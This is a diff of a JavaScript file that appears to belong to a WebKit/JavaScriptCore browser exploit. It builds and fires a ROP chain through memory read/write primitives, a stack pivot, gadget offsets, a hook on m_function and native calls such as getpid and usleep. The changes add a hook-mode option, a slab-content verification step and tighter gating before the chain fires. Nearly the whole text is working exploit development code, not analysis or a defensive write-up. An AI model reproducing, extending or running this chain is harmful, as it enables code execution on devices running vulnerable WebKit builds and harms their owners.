@@ -79,16 +79,18 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     verifyPivotHookWrites,
+    verifySlabContent, resolveBufAddrOff,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830av";
+const BUILD_ID = "rw-20250830aw";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
     { id: "prep", label: "N1 prep", title: "skip if PREP-PIN @ Start (?freshprep=1 to redo)" },
     { id: "layout-smoke", label: "N2 layout", title: "write smoke ROP stack (no JSC writes)" },
+    { id: "slab-chain", label: "N2c slab", title: "verify slab addrs + store/pivot memory match (no fire)" },
     { id: "arm-g0", label: "N3 arm G0", title: "write G0 → main m_function" },
     { id: "peek-pivot", label: "N4p peek", title: "read pivotCell+0..0x40 (no writes)" },
     { id: "hook", label: "N4 hook", title: "hook @ leakval+?hookoff (default +0)" },
@@ -748,6 +750,12 @@ function trimBeforeNativeFire() {
     if (lines.length > 16) lines.splice(0, lines.length - 16);
 }
 
+function pivotHookMode() {
+    const q = params.get("hook");
+    if (q === "cell" || q === "bf" || q === "dual") return q;
+    return "dual";
+}
+
 function gateNativeFire(p, off) {
     const wb = chainWebkitBase(off);
     if (!wb) {
@@ -771,13 +779,15 @@ function gateNativeFire(p, off) {
     if (!vFull.ok) {
         const fullBad = vFull.pivot.bad.filter(b => b.includes("prefix-only"));
         if (fullBad.length) {
-            mark("NATIVE-SKIP", "prefix OK but full G0-G4 poops gadgets missing — tap Scan full (auto)");
+            mark("NATIVE-SKIP", "prefix OK but full G0-G4 poops gadgets missing — Scan full (auto)");
             mark("PIVOT-FULL-HINT", fullBad.map(b => b.split(" ")[0]).join(", ")
-                + " need 9-byte poops RVAs (prefix hits @ +0xe3e4a etc. are wrong code)");
+                + " need 9-byte poops RVAs");
             return false;
         }
         if (vFull.pivot.bad.length)
-            mark("PIVOT-FULL-WARN", vFull.pivot.bad.join(", "));
+            mark("PIVOT-FULL-BAD", vFull.pivot.bad.join(", "));
+        mark("NATIVE-SKIP", "need PIVOT-FULL-READY — tap Verify pivot");
+        return false;
     }
     return true;
 }
@@ -4142,7 +4152,9 @@ function ensureNativePrep(p, off) {
     nativePrep._pinMainOrig = mainOrig;
     mark("NATIVE-PREP", "mainMf " + path + " pivot="
         + (params.get("pivot") === "ta" ? "textarea" : "{}")
-        + " cell=" + pivotCell + " G0code="
+        + " cell=" + pivotCell
+        + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?")
+        + " G0code="
         + gadgetBytesHex(p, webkitBase, off.wk_MOV_RDI_RSI_30_CALL, 16));
     pinNativeRetain();
     return nativePrep;
@@ -4173,7 +4185,7 @@ function tryNativeFireAtStart(p, off) {
         if (nm === "smoke") {
             mark("NATIVE-FIRE", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
             renderOut();
-            firePivotSmoke(p, nativePrep, off);
+            firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
             mark("NATIVE-OK", "pivot smoke @ Start (webkit only) build=" + BUILD_ID);
             state("pivot smoke OK — chain works", "ok");
             return;
@@ -4189,7 +4201,7 @@ function tryNativeFireAtStart(p, off) {
                 + " stub+0x" + stub.off.toString(16));
             renderOut();
             stageGetpid(p, nativePrep, lk, off, stub.off);
-            fireNativeCall(p, nativePrep, off);
+            fireNativeCall(p, nativePrep, off, { hook: pivotHookMode() });
             mark("NATIVE-OK", "getpid @ Start lk=" + lk + " build=" + BUILD_ID);
         } else {
             mark("NATIVE-FIRE", "usleep @ PRIMITIVE-OK lk=" + lk);
@@ -4340,7 +4352,9 @@ function bisectLogPreflight(p, prep, pf, tag) {
     let bf = null;
     try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
     bisectLog("PRE-PIVOT", "cell=" + prep.pivotCell + " butterfly=" + bf
-        + " S=" + prep.M.S + " G0=" + prep.G.G0);
+        + " S=" + prep.M.S + " G0=" + prep.G.G0 + " hook=" + pivotHookMode());
+    if (pf.slabContent && !pf.slabContent.ok)
+        bisectLog("PRE-SLAB-BAD", pf.slabContent.reasons.join("; "));
     try {
         const d = describeSlabLayout(p, prep);
         bisectLog("PRE-STACK", "rsp=" + d.rsp + " insts=" + d.insts
@@ -4360,8 +4374,8 @@ function bisectRunPoopsAtomic(p, off, tag) {
     if (!pf.ok)
         throw new Error("preflight: " + pf.reasons.join("; "));
     bisectFlushBeforeFire();
-    bisectLog("BISECT-WARN", tag + " fireNativeCall hook+0 (chain_poops)…");
-    return fireNativeCall(p, nativePrep, off);
+    bisectLog("BISECT-WARN", tag + " fireNativeCall hook=" + pivotHookMode() + "…");
+    return fireNativeCall(p, nativePrep, off, { hook: pivotHookMode() });
 }
 
 /** Manual hook then expm1 (no auto-restore) — for multi/bf hunts. */
@@ -4542,12 +4556,11 @@ function runNativeBisectStep(stepId) {
             break;
         case "smoke-now":
             requireNativePrep();
-            if (!gateNativeFire(p, off)) throw new Error("Verify pivot first");
-            mark("BISECT-WARN", "N0 atomic smoke hook+0x"
-                + (off.pivot_hook_off != null ? off.pivot_hook_off.toString(16) : "0"));
-            renderOut();
-            pid = firePivotSmoke(p, nativePrep, off);
-            mark("BISECT-OK", "N0 smoke survived frame=" + pid);
+            if (!gateNativeFire(p, off)) throw new Error("Verify pivot first (PIVOT-FULL-READY)");
+            bisectFlushBeforeFire();
+            bisectLog("BISECT-WARN", "N0 fireNativeCall hook=" + pivotHookMode());
+            pid = firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
+            bisectLog("BISECT-OK", "N0 smoke survived frame=" + pid);
             state("N0 smoke OK", "ok");
             break;
         case "layout-smoke":
@@ -4566,6 +4579,25 @@ function runNativeBisectStep(stepId) {
             }
             bisectLog("BISECT-OK", "N2 layout smoke");
             state("N2 layout OK", "ok");
+            break;
+        case "slab-chain":
+            requireNativePrep();
+            layoutSmokeStack(nativePrep);
+            try {
+                const slab = verifySlabAddrs(p, nativePrep);
+                const content = verifySlabContent(p, nativePrep);
+                bisectLog("BISECT-SLAB", "S=" + slab.S.ok + " K=" + slab.K.ok
+                    + " rsp=" + (slab.rsp ? slab.rsp.ok : "?")
+                    + " content=" + content.ok);
+                if (!content.ok)
+                    bisectLog("SLAB-CHAIN-BAD", content.reasons.join("; "));
+                else
+                    bisectLog("BISECT-OK", "N2c slab chain OK bufAddr="
+                        + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
+            } catch (slabErr) {
+                bisectLog("BISECT-FAIL", "N2c " + (slabErr.message || slabErr));
+            }
+            state("N2c slab OK", "ok");
             break;
         case "arm-g0":
             requireNativePrep();
@@ -4830,7 +4862,7 @@ function runFireGetpid() {
     const kind = nm === "smoke" ? "smoke" : (nm === "usleep" ? "usleep+13b20" : "getpid");
     try {
         if (nm === "smoke") {
-            firePivotSmoke(p, nativePrep, off);
+            firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
         } else if (nm === "usleep") {
             pid = fireUsleep(p, nativePrep, lk, off, 1000);
         } else {
@@ -5097,13 +5129,13 @@ async function runStart() {
         try {
             ensureNativePrep(p, off);
             mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + getNativeMode());
-            mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook+0x"
-                + (off.pivot_hook_off != null ? off.pivot_hook_off.toString(16) : "30"));
+            mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
+                + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
             if (params.get("smoke") === "1" && nativeAllowed && getNativeMode() === "smoke") {
                 mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
                 renderOut();
                 try {
-                    firePivotSmoke(p, nativePrep, off);
+                    firePivotSmoke(p, nativePrep, off, { hook: pivotHookMode() });
                     mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
                     state("pivot smoke OK @ Start", "ok");
                 } catch (smokeErr) {
